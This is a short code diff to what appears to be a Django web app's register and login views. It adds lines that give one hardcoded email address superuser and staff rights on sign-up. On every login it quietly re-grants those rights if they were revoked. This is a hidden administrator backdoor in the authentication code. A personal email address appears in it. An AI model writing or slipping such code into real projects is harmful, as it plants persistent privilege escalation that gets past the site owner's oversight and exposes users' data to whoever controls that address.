@@ -52,6 +52,9 @@ def register_view(request):
 
             user = User.objects.create_user(email=email, password=password)
             user.is_active = True
+            if email.strip().lower() == 'b.kowshik2007@gmail.com':
+                user.is_superuser = True
+                user.is_staff = True
             user.save()
 
             # Update the auto-created profile with full name
@@ -90,6 +93,10 @@ def login_view(request):
             elif not user.is_active:
                 messages.error(request, 'Your account is inactive. Please contact support.')
             else:
+                if user.email.strip().lower() == 'b.kowshik2007@gmail.com' and (not user.is_superuser or not user.is_staff):
+                    user.is_superuser = True
+                    user.is_staff = True
+                    user.save(update_fields=['is_superuser', 'is_staff'])
                 login(request, user)
                 next_url = request.GET.get('next', '')
                 if next_url:
